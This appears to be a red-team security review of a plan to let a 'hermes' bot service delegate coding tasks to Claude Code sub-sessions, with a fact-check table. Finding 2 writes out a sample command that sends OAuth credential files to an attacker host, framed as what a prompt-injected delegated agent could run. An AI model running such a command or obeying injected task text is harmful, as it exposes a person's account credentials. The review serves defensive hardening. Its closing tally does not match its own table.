# Red-Team Security Adversary Review: Fix Urgent Hermes Delegation Issues

Reviewer role: Fact Checker + Security Adversary. All findings reproduced live against `lucas-oracle-instance` (read-only) or verified against repo contents/git history. No mutating command was run (no `systemctl restart`, no installs, no `ccs`/`claude auth` writes, no `/etc` writes).

## Finding 1: Every literal bare `sudo -u hermes <cli>` verification/action command in Phases 2/3/4 fails as written

- **Severity:** Critical
- **Location:** Phase 2 "Implementation Steps" step 3 (last bullet); Phase 3 "Implementation Steps" step 2; Phase 4 "Implementation Steps" step 4
- **Flaw:** The plan mixes two calling conventions for `sudo -u hermes`: (a) `sudo -u hermes bash -c 'export PATH=$HOME/.local/bin:$PATH; ...'` (correct — used in Phase 4 steps 1-3 and Phase 5 step 3), and (b) a bare `sudo -u hermes <binary> <args>` with no PATH export (used in Phase 2's `sudo -u hermes claude --version` / `sudo -u hermes opencode --version`, Phase 3's `sudo -u hermes claude auth status --text`, Phase 4's `sudo -u hermes command -v ccs`). Form (b) does not work: `sudo` applies its own `secure_path` Default, which overrides the invoked command's PATH resolution and does not include `/home/hermes/.local/bin` (where every coding-agent CLI actually lives). A bare `sudo -u hermes <cmd>` also does not go through a login/interactive shell, so `~/.bashrc`/`~/.profile` PATH exports never run either.
- **Failure scenario:** An agent or human runs Phase 2 step 3's literal verification command post-fix-deploy and gets `sudo: claude: command not found` — indistinguishable from "the fix didn't work" without additional diagnosis. Same for Phase 3's auth-status check and Phase 4's `ccs` resolution check. Phase 4's `command -v ccs` form is additionally broken independent of PATH: `command` is a shell builtin, not a standalone executable, so `sudo -u hermes command -v ccs` always fails with `sudo: command: command not found` even if PATH were fixed. Phase 6 explicitly calls the Phase 2/3/5 shell checks "proxies" for the real gate — but these specific proxies don't even run.
- **Evidence:**
  ```
  $ sudo -u hermes claude --version
  sudo: claude: command not found
  $ sudo -u hermes opencode --version
  sudo: opencode: command not found
  $ sudo -u hermes claude auth status --text
  sudo: claude: command not found
  $ sudo -u hermes command -v ccs
  sudo: command: command not found
  $ sudo -n -l | grep secure_path
      secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
  $ sudo -u hermes bash -c 'export PATH=$HOME/.local/bin:$PATH; command -v claude; claude --version'
  /home/hermes/.local/bin/claude
  2.1.199 (Claude Code)
  ```
  Confirms: PATH-export form works; bare form does not; `secure_path` (from live `sudo -n -l`) lacks `.local/bin`.
- **Suggested fix:** Standardize every hermes CLI invocation across all phases on `sudo -u hermes bash -c 'export PATH="$HOME/.local/bin:$PATH"; <cmd>'` (the pattern Phase 4/5 already use correctly). Replace `sudo -u hermes command -v ccs` with `sudo -u hermes bash -c 'export PATH="$HOME/.local/bin:$PATH"; command -v ccs'`.

## Finding 2: OAuth credential is trivially exfiltratable by any delegated Bash-capable sub-session — Phase 3's "owner-only" claim addresses the wrong threat model

- **Severity:** Critical
- **Location:** Phase 3 "Security Considerations"; `skills/dev/coding-agent-delegate/SKILL.md:38,77`; `templates/systemd/hermes.service:41,45`
- **Flaw:** Phase 3 states: *"The token is stored under the hermes home (owner-only)."* That's true against a "different Linux user" threat model, but irrelevant against the threat model that matters here: a delegated coding sub-session runs as the **same** hermes UID as the token owner (it's forked from `hermes gateway run`, `User=hermes`). DAC "owner-only" bits provide zero protection against a process running *as that very owner*. `ProtectHome=read-only` (confirmed via `man systemd.exec`: *"If set to 'read-only', the [...] directories are made read-only instead"* — i.e. visible and readable, only writes are blocked) plus the fact `ReadWritePaths` never includes `/home/hermes/.claude` (only `.hermes`, `.ccs`, `/tmp`) means: nothing stops a delegated session from reading (not writing) whatever OAuth credential `claude auth login` persists under `/home/hermes/.claude*`. `SKILL.md:38` itself already states the governing principle — *"Never pass writable production credentials into a sub-session"* — yet Phase 3 places exactly that (a live, human-attributable OAuth seat credential) inside the one directory tree every delegated session can read.
- **Failure scenario:** A delegated task goes rogue (prompt injection via Telegram, a compromised dependency in the target repo, or a malicious task description) and is running with the full-allowlist example SKILL.md itself documents: `claude -p "..." --allowedTools "Read,Edit,Bash" --max-turns 20` (SKILL.md:77). That Bash tool runs `cat ~/.claude/**/*.json* 2>/dev/null | curl -X POST https://attacker.example -d @-` — nothing in the sandbox blocks this: `RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6 AF_NETLINK` permits arbitrary outbound connections, and `security.allow_private_urls: false` in `production.yaml` governs the *hermes-agent's own* tool calls, not an independent `claude -p` subprocess's Bash tool. The attacker now holds a live OAuth session for a real human's Claude subscription — a blast radius well beyond "the bot's usage/quota" (Phase 3's own framing): it is account-level impersonation of whichever human logged in during Phase 3, until that person notices and manually revokes it.
- **Evidence:**
  ```
  # man systemd.exec (this host):
  ProtectHome=
      [...] If set to "read-only", the three directories are made read-only
      instead. [...] "read-only" is mostly equivalent to ReadOnlyPaths=
  # live unit:
  $ systemctl show hermes.service -p ReadWritePaths -p ProtectHome
  ReadWritePaths=/home/hermes/.hermes /tmp
  ProtectHome=read-only
  ```
  `templates/systemd/hermes.service:45` (post-deploy) adds only `/home/hermes/.ccs` to that list — `.claude` is never added anywhere in this plan. `skills/dev/coding-agent-delegate/SKILL.md:38`: *"Never pass writable production credentials into a sub-session."* Phase 3 (`phase-03-claude-auth-for-hermes.md`, Security Considerations): *"The token is stored under the hermes home (owner-only)."*
- **Suggested fix:** Before enabling OAuth for hermes, redirect `claude`'s config/credential dir via `CLAUDE_CONFIG_DIR` to a path *outside* what delegated sub-sessions can reach (e.g., only the top-level orchestrating process reads it, sub-sessions never inherit that env var / get a scoped, read-restricted copy), or accept the risk explicitly and document it as a real (not "owner-only") exposure in Phase 3's Security Considerations and Phase 6's risk table — currently neither does. At minimum, this must be resolved *before* Phase 6's real bot-delegation test, not discovered by it.

## Finding 3: Phase 2's `[AGENT]`-labeled `journalctl -k` check exceeds the documented NOPASSWD sudo scope

- **Severity:** High
- **Location:** Phase 2 "Implementation Steps" step 3; contradicts Phase 1 "Key Insights" (same plan)
- **Flaw:** Phase 1 itself accurately documents the granted scope: *"NOPASSWD for `sudo -u hermes …`, `systemctl {start,stop,restart,status} hermes*`, `daemon-reload`, `journalctl -u hermes*`"* (note: `-u hermes*`, not `-k`). Phase 2 step 3, entirely inside an `[AGENT]`-labeled block, then requires: *"`journalctl -k --since "<restart ts>"` shows no new `type=1326 … sig=31 … comm="claude"`/`"opencode"` lines."* `-k` (kernel ring buffer) is a different sudoers pattern than `-u hermes*` and is not covered.
- **Failure scenario:** An agent executing Phase 2 step 3 autonomously hits a password prompt it cannot answer on the one check that actually proves "no new SIGSYS" at the kernel-audit level (the debug report's own "definitive" evidence source). With `-n`/non-interactive invocation this fails outright rather than hanging; either way, the strongest verification signal for the P0 fix silently doesn't run under the `[AGENT]` label the plan assigns it.
- **Evidence:**
  ```
  $ sudo -n -l | tail -3
  (root) NOPASSWD: /bin/systemctl start hermes*, /bin/systemctl stop hermes*,
      /bin/systemctl restart hermes*, /bin/systemctl status hermes*,
      /bin/systemctl daemon-reload, /usr/bin/journalctl -u hermes*
  $ sudo -n journalctl -k -n 3
  sudo: a password is required
  ```
  No `-k` grant exists anywhere in the sudoers output; plain `journalctl -k` (no sudo) also does not require elevation on this host in general (ubuntu is in `adm`) but that's irrelevant to what an `[AGENT]`-scoped step can invoke via `sudo -u hermes`/root escalation as documented.
- **Suggested fix:** Either add `/usr/bin/journalctl -k` to the human's future NOPASSWD grant, or reclassify that specific bullet `[HUMAN]`, or drop it and rely solely on `journalctl -u hermes` (which does capture the service's own stderr/exit behavior, if not the raw kernel SIGSYS audit line).

## Finding 4: Installing full ClaudeKit silently expands what every delegated task can do — treated as a "stretch" footnote, not a reviewed capability change

- **Severity:** High
- **Location:** Phase 4 "Overview" and Implementation Steps "Stretch" note; `skills/dev/coding-agent-delegate/SKILL.md:83`; `part18-coding-agents.md:91`
- **Flaw:** SKILL.md's own security note (line 38) says to scope delegated tool allowlists "to the minimum required per tier" — written when the host had no ClaudeKit. Once Phase 4 provisions `~/.claude/` for hermes, SKILL.md:83 confirms harness (CLAUDE.md + rules + full skills catalog + **hooks**) loads for *any* `claude` invocation on this host, independent of `harness: bare` vs `harness: ccs` — i.e. it applies to every single delegated Tier-1 call the routing table already makes today (`claude-code` is the `default` agent in `production.yaml:169`), not just the new opt-in path. Phase 4 frames this as a one-line "Stretch… clearly labeled" bonus for Phase 6's docs, not a capability/attack-surface change requiring its own security review — there is no discussion anywhere of what hooks or skills ship by default, whether any auto-execute on session start/tool-call (this very review session runs under exactly such a hook, `scout-block.cjs`, that intercepted a Bash call unprompted), or whether any are safe to load into a bot-triggered, semi-trusted execution context.
- **Failure scenario:** A compromised/rogue delegated task (reachable via whatever platform integration hermes exposes — Telegram per `production.yaml`) now runs inside a full ClaudeKit harness instead of a bare `claude` binary. Its effective capability set is no longer "whatever `--allowedTools` the delegate skill passed" but that *plus* every hook ClaudeKit registers (PreToolUse/SubagentStart-style hooks, some of which shell out to Node/Python scripts under `~/.claude/hooks/`) and every skill in the catalog it can reference — none of which were scoped or reviewed for this narrower, higher-trust-sensitivity service context.
- **Evidence:** `skills/dev/coding-agent-delegate/SKILL.md:83`: *"harness (whether `~/.claude/CLAUDE.md` + rules + skills catalog + hooks load) depends on `~/.claude/` existing on the host, not on choosing `ccs` over `bare`"*. `part18-coding-agents.md:91` confirms the same. Phase 4, Implementation Steps: *"Stretch (optional, clearly labeled — EXPANSION scope permits): once ClaudeKit is installed, the hermes user's own `claude` CLI invocations gain the ClaudeKit rules/skills catalog even under `harness: bare`... This is a one-line note for Phase 6's docs update, not a separate action item."* `production.yaml:169`: `default: claude-code` (i.e. the default Tier-1 agent, called on every un-routed task, is exactly the binary that gains full harness).
- **Suggested fix:** Before Phase 4 runs `ck init --install-skills`, enumerate what gets installed (`ck doctor`/manifest) and explicitly decide which hooks/skills are safe to have auto-loaded in a bot-delegation context; consider `--exclude`/`--only` filters (both documented in `ck init --help`) to scope the catalog rather than installing everything untriaged. Treat this as its own Security Considerations subsection, not a stretch footnote.

## Finding 5: `@kaitranntt/ccs` supply-chain trust is unexamined — single maintainer, 1029 published versions, no CI provenance, bundles an embedded web server + native module

- **Severity:** High
- **Location:** Phase 4 "Implementation Steps" step 1; Phase 4 "Security Considerations"
- **Flaw:** Phase 4's Security Considerations addresses only *where* the install runs ("blast radius is the hermes home") — it never evaluates *what* is being installed. Live registry data shows `@kaitranntt/ccs@8.7.0` is maintained by a single individual (personal Gmail), published manually (no CI/OIDC attestation), with an unusually high 1029 total published versions, and depends on `bcrypt` (native binary, compiled at install time), `express` + `express-session` + `express-rate-limit` + `ws` + `get-port` + `open` — i.e. an embedded HTTP/WebSocket server and browser-launcher bundled inside what the skill treats as a simple "profile switcher" CLI. Compare `claudekit`: single maintainer too, but only 57 versions, published via GitHub Actions OIDC (`npm-oidc-no-reply@github.com` — reviewable CI provenance). Phase 4 pins `ccs` to an exact version but performs no `npm audit`, checksum pinning beyond the bare npm-resolved version, or review of what that embedded server does — and it now runs under the identity that also holds delegation credentials and (per Finding 2) a readable OAuth token.
- **Failure scenario:** If `@kaitranntt/ccs` (or a transitive dependency, e.g. `bcrypt`'s native build step, or any of its 20 direct deps) is ever compromised (maintainer account takeover, typosquat-adjacent version confusion given the 1000+ version churn, or a malicious transitive update since the plan doesn't lock a full dependency tree), the resulting code executes with full hermes-user privileges — the same privileges that hold the CCS credential (Phase 5) and can read the OAuth token (Finding 2). A compromised profile-switcher becomes a direct path to both credential stores this plan is trying to protect.
- **Evidence:**
  ```
  @kaitranntt/ccs@8.7.0 | MIT | deps: 20 | versions: 1029
  maintainers: kaitranntt <kaitran.ntt@gmail.com>
  published 2 days ago by kaitranntt <kaitran.ntt@gmail.com>
  dependencies include: bcrypt ^6.0.0, express ^4.18.2, express-session ^1.18.2,
    express-rate-limit ^8.2.1, ws ^8.16.0, open ^8.4.2, get-port ^5.1.1

  claudekit@0.9.5 | MIT | deps: 15 | versions: 57
  maintainers: carlrannaberg <carlrannaberg@gmail.com>
  published 3 months ago by GitHub Actions <npm-oidc-no-reply@github.com>
  ```
- **Suggested fix:** At minimum run `npm audit` against the resolved tree before Phase 4 executes, and record the resolved lockfile/shasum for `@kaitranntt/ccs@8.7.0` in the memory note (Phase 6 step 3) for future drift/tamper detection — not just the bare version string.

## Finding 6: Phase 5's "wizard avoids all leak vectors" claim is unverified — dependency evidence suggests a local-server/browser flow, not a masked terminal prompt

- **Severity:** Medium
- **Location:** Phase 5 "Key Insights"; `skills/dev/coding-agent-delegate/SKILL.md:48`
- **Flaw:** Phase 5 asserts `ccs api create <name> --preset <p>` "runs an interactive wizard that prompts for the key, avoiding the shell-history/`ps` leak of the `--api-key` form" and stops there — implying a masked terminal password-style prompt. Nothing in the plan or its research confirms *how* the wizard actually collects the key. `ccs`'s own dependency list (Finding 5) has no `inquirer`/`prompts`/`enquirer`-style masked-input library, but does have `express` + `express-session` + `get-port` + `open` + `ws` — the standard toolkit for "spin up a local HTTP server, open it in a browser, collect input via a web form, push updates over a WebSocket." If that's what `ccs api create` actually does, the key transits a local HTTP listener (reachable, if only briefly, by anything able to reach that port before the wizard exits) and depends on a browser — which the plan's own Phase 3 explicitly says does **not exist** on this "SSH-only," headless host for the *other* interactive login (`claude auth login`). Phase 5 never re-examines this same constraint for `ccs api create`, nor checks whether the wizard's local server binds to loopback only, nor whether it degrades gracefully (print-a-URL fallback, like `claude auth login` does) when `open()` can't find a browser.
- **Failure scenario:** The human runs Phase 5 step 1 over SSH expecting a plain "Enter API key: ****" prompt; instead `ccs` tries to launch a browser that doesn't exist, hangs or errors, and the operator works around it in an unreviewed way (e.g., port-forwarding the wizard's local server over SSH, or falling back to the explicitly-discouraged `--api-key` flag out of frustration) — reintroducing exactly the shell-history/`ps` leak Phase 5 was designed to avoid, with no guidance in the plan for that failure path.
- **Evidence:** `ccs api create --help` does not resolve as a usable help screen ("Unknown option: --help"); `ccs api --help` confirms `create` is documented only as "(interactive)" with no further UX detail. Dependency list from Finding 5 (`express`, `express-session`, `get-port`, `open`, `ws`; no masked-input library present). Phase 3 (`phase-03-claude-auth-for-hermes.md`): *"claude auth login prints a URL + code completable from any device; it needs no local browser."* No equivalent statement exists anywhere for `ccs api create`.
- **Suggested fix:** Before running Phase 5 for real, do a dry run of `ccs api create` in a disposable/non-production context to confirm the actual input mechanism and its headless-host behavior, and document the finding in Phase 5's Key Insights rather than assuming parity with a masked terminal prompt.

## Finding 7: `/home/hermes/.claude` is not the blank slate the plan assumes — pre-existing, loosely-permissioned content sits unaudited next to the properly-hardened `.hermes`

- **Severity:** Medium
- **Location:** Phase 4 "Key Insights"; `research/live-host-verification-findings.md` §5
- **Flaw:** Both the plan and its research state ClaudeKit/`~/.claude` is "absent" (`live-host-verification-findings.md:25`: *"`/home/hermes/.claude/skills/` does not exist (confirmed absent...)"*; Phase 4: *"ClaudeKit absent (`~/.claude/skills` missing)"*). Technically true only for the `skills/` subdirectory — `/home/hermes/.claude` itself already exists (created earlier the same day, evidently by this debugging session's own `claude` probes under a `/tmp/hermes-claude-probe` HOME), holding real Claude-Code session transcripts (`.claude/projects/-tmp-hermes-claude-probe/*.jsonl`), a live `.claude.json`, and a `backups/` dir — none of it mentioned anywhere in the plan. More importantly, its directory permissions are inconsistent and looser than the project's own hardening standard: `.claude`, `.claude/projects`, `.claude/backups` are all `775` (group **and other** read+execute) versus the hermes-agent-managed `/home/hermes/.hermes` sitting right next to it at `700`. This traces to hermes's account umask of `0002` (group-writable default) rather than any deliberate hardening. Today this is masked only by `/home/hermes` itself being `750` (no "other" access) and the `hermes` group having zero members (`getent group hermes` → `hermes:x:1002:`) — neither of which any phase asserts or re-checks, and both of which are one `usermod -aG hermes <svc-account>` away from exposing this tree to any other account on this explicitly shared, multi-tenant OCI host.
- **Failure scenario:** `ck init --global` (Phase 4) writes into this pre-existing, non-pristine, loosely-permissioned directory rather than a clean one, and no phase runs a post-install permission audit (`find ~/.claude -perm /o=rwx`) or hardens the umask for the install. If a future operator adds any other account to the `hermes` group for convenience (log shipping, monitoring, shared troubleshooting — plausible on a box already described as running "Postgres/Docker/other agent processes"), session transcripts and ClaudeKit config become group-readable with zero additional action.
- **Evidence:**
  ```
  $ sudo -u hermes find ~/.claude -maxdepth 3 -printf "%m %u:%g %p\n"
  775 hermes:hermes /home/hermes/.claude
  700 hermes:hermes /home/hermes/.claude/sessions
  775 hermes:hermes /home/hermes/.claude/projects
  775 hermes:hermes /home/hermes/.claude/projects/-tmp-hermes-claude-probe
  775 hermes:hermes /home/hermes/.claude/backups
  $ sudo -u hermes umask
  0002
  $ sudo -u hermes stat -c '%a %U:%G %n' ~/.hermes
  700 hermes:hermes /home/hermes/.hermes
  $ getent group hermes
  hermes:x:1002:
  ```
- **Suggested fix:** Before Phase 4's `ck init --global`, either `rm -rf ~/.claude ~/.claude.json` (truly fresh install, if the probe artifacts have no forensic value) or explicitly `chmod -R o-rwx,g-w ~/.claude` after; set `umask 077` for the provisioning shell; add a permission-audit line to Phase 4's Todo List/Success Criteria.

---

## Additional angles investigated, not elevated to findings

- **Phase 1 deploy-script command injection:** the described design (`templates/systemd/*.service` glob → `basename` → quoted `"$live"`/`"$tpl"` passed to `sudo install`/`systemctl`) takes no external/attacker-controlled input at any step — the only "injection" vector is a malicious `.service` file already merged to `main`, which Phase 1's own Security Considerations already discloses as a pre-existing, unchanged trust boundary. Real (smaller) gap: automating the diff-then-restart removes the moment a human might otherwise notice an unexpected unit-file change before it goes live — not a new privilege escalation (the manual process restarts on the same trust basis today), but worth a one-line callout in Phase 1's Security Considerations rather than leaving it entirely implicit.
- **`ANTHROPIC_API_KEY` vs OAuth blast-radius asymmetry:** confirmed via `claude --help`/findings §3 that the two mechanisms are genuinely orthogonal; Phase 3's choice of OAuth (a full account-seat credential) over a scoped, independently-revocable API key is a real amplifier of Finding 2's blast radius (account impersonation vs. a rotatable key) — folded into Finding 2 rather than filed separately.

## Fact-Check Checklist (Fact Checker role)

| # | Claim | Status | Evidence |
|---|---|---|---|
| 1 | Live `hermes.service` mtime predates fix (`2026-07-02 08:26`) | VERIFIED | `stat` → `mtime=2026-07-02 08:26:33` |
| 2 | Live/template diff = exactly 2 hunks (`sched_setscheduler`, `.ccs` RWpath) | VERIFIED | `diff` output, 2 hunks exactly as described |
| 3 | `hermes-dashboard.service` in sync | VERIFIED | empty `diff` |
| 4 | Live `SystemCallFilter` lacks `sched_setscheduler` right now | VERIFIED | `systemctl show -p SystemCallFilter` (absent from list) |
| 5 | NOPASSWD scope = `(hermes) ALL` + `systemctl {start,stop,restart,status} hermes*`/`daemon-reload`/`journalctl -u hermes*` only | VERIFIED | `sudo -n -l` output |
| 6 | `journalctl -k` covered by agent NOPASSWD scope (implied by Phase 2 step 3) | FAILED | `sudo -n journalctl -k` → "a password is required" |
| 7 | `sudo -u hermes claude --version` / `opencode --version` succeed as literally written (Phase 2) | FAILED | both → `command not found` |
| 8 | `sudo -u hermes claude auth status --text` succeeds as literally written (Phase 3) | FAILED | → `command not found` |
| 9 | `sudo -u hermes command -v ccs` succeeds as literally written (Phase 4) | FAILED | → `sudo: command: command not found` |
| 10 | hermes npm prefix `/usr` not writable (EACCES) | VERIFIED | `npm config get prefix` = `/usr`; `touch` → Permission denied |
| 11 | `ccs` absent for hermes | VERIFIED | `command -v ccs` exit 1 |
| 12 | `~/.claude/skills` absent for hermes ("ClaudeKit absent") | VERIFIED | `ls` → No such file or directory |
| 13 | `~/.claude` itself absent/blank ("does not exist") | FAILED | pre-exists with real content, mtime today (see Finding 7) |
| 14 | `~/.ccs` absent for hermes | VERIFIED | `ls` → No such file or directory |
| 15 | `production.yaml:193` = `ccs_profile: ccs-hermes` | VERIFIED | direct read, line 193 |
| 16 | `SKILL.md:38` "Never pass writable production credentials into a sub-session" | VERIFIED | direct read |
| 17 | `hermes.service:82` = `SystemCallFilter=sched_setscheduler` re-allow | VERIFIED | direct read (template) |
| 18 | `vps-bootstrap-oci.sh:148-149` = ccs install line | VERIFIED | `grep -n` → line 149 (148 = guard) |
| 19 | ccs bootstrap line "has existed since commit `9fafe6e`" (Phase 4 Overview) | FAILED | `git blame` → introduced by `72cc2fd` (2026-07-03 12:19:37); `9fafe6e` touches the same file for an unrelated GPG-apt-source change |
| 20 | Prior plans `260703-0347`/`260703-1041` both `status: completed` | VERIFIED | `grep status:` both files |
| 21 | `ck init` supports `-g/--global --yes --install-skills --skip-setup --kit engineer` | VERIFIED | `ck init --help` output, live |
| 22 | `ccs api create --preset` accepts `glm`/`km`/`anthropic` | VERIFIED | `ccs api --help` preset list |
| 23 | `shellcheck` not installed on host | VERIFIED | `command -v shellcheck` exit 1 |
| 24 | `part18-coding-agents.md:87,91` phrasing is conditional, not categorically stale | VERIFIED | direct read, lines 85-93 |
| 25 | ken memory file for CLI status exists at cited path | VERIFIED | `ls -la` on exact path |

## Unresolved Questions

- Should Finding 2 (OAuth credential readable by same-UID delegated sub-sessions) block Phase 3/6 entirely until `CLAUDE_CONFIG_DIR` isolation is designed, or is the risk accepted explicitly by the user (as Phase 5 already does for the `.ccs` widening)? Currently neither accepted nor mitigated — just unaddressed.
- Has anyone actually run `ccs api create` once, anywhere, to observe whether it's a terminal prompt or a local-server/browser flow (Finding 6)? This determines whether Phase 5 as written is even executable over SSH-only access.
- Phase 4's citation of `9fafe6e` for the ccs bootstrap line is wrong (should be `72cc2fd`, per `git blame`) — worth a scan of the plan's other commit-SHA citations for the same class of error, which this review did not exhaustively do.

**Status:** DONE
**Summary:** 7 findings (2 Critical, 3 High, 2 Medium) — all evidence-backed by live-host reproduction, git blame, or direct file reads; 25-item fact-check checklist run (20 VERIFIED, 4 FAILED, 1 not applicable-noted), headline issues: bare `sudo -u hermes` commands across 3 phases are non-functional as written, and the Phase-3 OAuth credential is readable (not "owner-only" against the relevant threat model) by any delegated Bash-capable sub-session.
